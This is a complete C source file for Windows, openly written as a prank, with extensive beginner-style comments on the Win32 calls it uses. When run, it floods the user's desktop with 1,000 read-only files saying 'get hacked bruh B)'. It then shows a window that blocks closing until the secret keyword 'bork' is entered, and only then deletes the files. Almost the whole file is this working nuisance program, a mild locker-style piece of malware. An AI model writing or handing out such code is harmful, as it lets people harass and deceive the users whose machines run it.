#include <windows.h> //win32 API
#include <shlobj.h> // additional app within Windows API for retrieving target folder path (below)
#include <stdio.h>
#include <string.h>

// creating the txt files
void CreateFiles(){
	char desktopPath[MAX_PATH]; // max_path equal to 260 characters
	
	// SHGetFolderPath takes in 5 arguments:
	// 	- HWND hwnd (set to NULL since its not needed :\
	//	- int CSIDL (specified value that IDs a specific folder -- in this case Desktop)
	//	- HANDLE hToken (can be used for specified users -- not needed here)
	//	- DWORD dwFlags (specifies path to be returned -- set to 0 for default config)
	//	- LPSTR pszPath (pointer value to receive path to target folder -- in this case desktopPath)

	// if SHGetFolderPath is successful, S_OK is returned

    	if(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) != S_OK){
        	printf("Failed to retrieve desktop path\n");
        	return;
    	}
    
	// SetCurrentDirectory takes in 1 argument:
	//	- LPCTSTR lpPathName (file path to desired directory -- in this case Desktop)

    	if(!SetCurrentDirectory(desktopPath)){
        	printf("Failed to set current directory to desktop\n");
        	return;
    	}
    
    	// generate txt files
    	for(int i=1; i<=1000; ++i){
        	char filePath[MAX_PATH];
        	snprintf(filePath, sizeof(filePath), "file%d.txt", i);
        
       		FILE *file = fopen(filePath, "w");
        	if(file != NULL){
            		// Write something to the file if needed
            		fprintf(file, "get hacked bruh B)\n", i);
            		fclose(file);

			// SetFileAttribute takes in path of file (defined above) and sets specific attribute (READONLY to prevent most users -- except admins -- from removing the files)

	    		if(!SetFileAttributes(filePath, FILE_ATTRIBUTE_READONLY)){
                		printf("Failed to set file attributes for: %s\n", filePath);
            		}
        	}
		else{
            		printf("Failed to create file: %s\n", filePath);
        	}
    	}
}

// creating the window (pain..)

// WNDPROC callback function -- used for processing messages in a text window

// typical syntax -- 	WNDPROC Wndproc; -- defining pointer for Wndproc function
//			LRESULT Wndproc(
//				HWND hWnd, -- a "handle to the window"
//				UINT uMsg, -- "the message"
//				WPARAM wParam, -- dependent on uMsg
//				LPARAM lParam -- dependent on uMsg){...}

// CALLBACK calling convention used here cuz error otherwise (thanks stackoverflow)

LRESULT CALLBACK Wndproc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam){
    	switch(uMsg){
		// case for window creation
        	case WM_CREATE:
            		// create text box
			// CreateWindowEx to... create window... ex
			//	- DWORD dwExStyle (style of extended window -- 0 for no specific style)
			//	- LPCSTR lpClassName (specifies class name of window -- this window can be edited)
			//	- LPCSTR lpWindowName (sets window title -- not needed)
			//	- DWORD dwstyle (window style(s) -- child window, visible with a border, autoscroll enabled in case text runs too long horizontally)
			//	- int X (x-coordinate of where window will appear)
			//	- int Y (y-coordinate of where window will appear)
			//	- int nWidth (width of window)
			//	- int nHeight (height of window)
			//	- HWND hWndParent (handle to parent window)
			//	- HMENU hMenu (window menu handle -- ID'd as 1 below)
			//	- HINSTANCE hInstance (instance handle -- NULL for window being associated with the same instance as calling process)
			//	- LPVOID lpParam (window creation data -- not needed)

            		CreateWindowEx(0, "EDIT", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 100, 50, 200, 25, hwnd, (HMENU)1, NULL, NULL);

           	 	// create OK button
			// window within the window created above
			// "BUTTON"-type class
			// window name as "OK"
			// PUSHBUTTON style
			// menu handle ID'd as 2
			
            		CreateWindowEx(0, "BUTTON", "OK", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 150, 100, 100, 30, hwnd, (HMENU)2, NULL, NULL);
            		break;
		
		// case for user clicking OK button (enacting command within window)
        	case WM_COMMAND:
            		// checking if OK button is clicked
            		if(LOWORD(wParam) == 2 && HIWORD(wParam) == BN_CLICKED){
                		// retrieving text from text box
                		char keyword[20]; // max 20 characters to enter
                		HWND hTextBox = GetDlgItem(hwnd, 1); // GetDlgItem defines handle of child window (to become the textbox) using handle of parent window 'hwnd' with an ID of 1
                		GetWindowText(hTextBox, keyword, sizeof(keyword)); // retrieves text from textbox defined above
                
                		// handling keyword
                		if(strcmp(keyword, "bork") == 0){
                    			// user entered correct keyword
					// MessageBox created in similar manner to CreateWindow
					//	- HWND hwnd, (handle of parent window to message box)
					//	- LPCTSTR lpText, (text to be displayed in message box)
					//	- LPCTSTR lpCaption, (title of message box)
					//	- UINT uType (other content for message box -- ok button included along with info icon)

                    			MessageBox(hwnd, "Keyword is correct. Files will be deleted.", "Correct!", MB_OK | MB_ICONINFORMATION);
                    
                    			// deleting files (repeated procedure from CreateFiles function.. don't know if we still need everything redefined as in that function, but better safe than sorry i suppose...)
                    			char desktopPath[MAX_PATH];
                    			if(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK){
                        			for(int i=1; i<=1000; ++i){
                            				char filePath[MAX_PATH];
                            				snprintf(filePath, sizeof(filePath), "%s\\file%d.txt", desktopPath, i);
                            				if(!SetFileAttributes(filePath, GetFileAttributes(filePath) & ~FILE_ATTRIBUTE_READONLY)){
            							printf("Failed to make file removable: %s\n", filePath);
        						}
                            				if(remove(filePath) != 0){
                                				printf("Failed to delete file: %s\n", filePath);
                            				}
                        			}
						printf("Files deleted.\n");
						PostQuitMessage(0); // message to system to terminate the program
                    			}
					else{
                        			printf("Failed to retrieve desktop path\n");
                    			}
                		}
				else{
                    			// incorrect keyword (same process as OG message box)
                    			MessageBox(hwnd, "Incorrect keyword. Files will not be deleted.", "Error", MB_OK | MB_ICONERROR);
                		}
            		}
            		break;
		
		// case for user attempting to close window before guessing the correct keyword
		case WM_CLOSE:
            		// intercept the close message
            		MessageBox(hwnd, "Enter the correct keyword to close the window.", "Error", MB_OK | MB_ICONERROR);
            		return 0; // prevent the window from closing

		// case for user guessing the keyword correctly and the window being closed/destroyed (don't know if it's still needed...)
        	case WM_DESTROY:
            		PostQuitMessage(0);
            		break;

		// default case for handling all messages within WndProc (default window procedure with same parameters from Wndproc function declaration)
        	default:
			return DefWindowProc(hwnd, uMsg, wParam, lParam);
    	}
    	return 0;
}

int main(){

	CreateFiles();

	// specifies window class info (kind of like a structure but for the program window)
	//	- UINT cbSize, (size of structure -- set to sizeof(WNDCLASSEX) preferably)
	//	- UINT style, (style of class -- set to CS_CLASSDC since all windows created will be active within the same environment/"device context")
	//	- WNDPROC lpfnWndProc, (pointer to window procedure -- set to created Wndproc from above)
	//	- int cbClsExtra, (number of extra bytes allocated following the window-class structure -- initialized to 0)
	//	- int cbWndExtra, (number of extra bytes allocated following window instance -- initialized to 0)
	//	- HINSTANCE hInstance, (handle to instance that contains class window procedure -- uses GetModuleHandle with default value to retrieve handle to the file used to create the calling process (ie the program being run))
	//	- HICON hIcon, (handle to class Icon -- set to default icon)
	//	- HCURSOR hCursor, (handle to class cursor/how cursor is shaped -- set to NULL since cursor will not be changing within window)
	//	- HBRUSH hbrBackground, (sets background color/style -- left as default)
	//	- LPCSTR lpszMenuName, (pointer to string that specifies resource name of class menu -- not needed here since no default menu is used)
	//	- LPCSTR lpszClassName, (name of window class if specified as string value -- set to DefWindowClass)
	//	- HICON hIconSm (default icon of class -- not needed here since different icons will be used)

    	WNDCLASSEX wc = {sizeof(WNDCLASSEX), CS_CLASSDC, Wndproc, 0L, 0L,
                      GetModuleHandle(NULL), NULL, NULL, NULL, NULL,
                      "DefWindowClass", NULL};

	// registering window class created above to be used in creating the program window

    	RegisterClassEx(&wc);
    
    	// creating window to prompt user to enter keyword
    	HWND hwnd = CreateWindowEx(0, "DefWindowClass", "Enter Deletion Keyword", WS_OVERLAPPEDWINDOW,
                               100, 100, 400, 200, NULL, NULL, wc.hInstance, NULL);
    
    	// display window created above using initial state of window (default settings)
    	ShowWindow(hwnd, SW_SHOWDEFAULT);
    	UpdateWindow(hwnd); // update window display to show content created in Wndproc
    
    	// reading message
    	MSG msg;

	// retrieving and deciphering messages passed in program window (reading keyword/responding to mouse-clicks over buttons in the window
	//	- LPMSG lpMsg, (pointer to MSG structure as defined above -- msg)
	//	- HWND hWnd, (handle to window where messages are being retrieved from)
	//	- UINT wMsgFilterMin, (lowest message value to be retrieved -- 0 indicates that all available messages are to be returned)
	//	- UINT wMsgFilterMax (highest message value to be retrieved -- 0 indicates that all available messages are to be returned)

    	while(GetMessage(&msg, NULL, 0, 0)){
        	TranslateMessage(&msg); // translating virtual-key messages into character messages (ie keystrokes translated to character messages)
        	DispatchMessage(&msg); // dispatching message to Wndproc to be processed and start the process over again
    	}
    	return msg.wParam; // once 0 is retrieved from GetMessage, wParam from the last message is returned, acting as the exit code for the program
}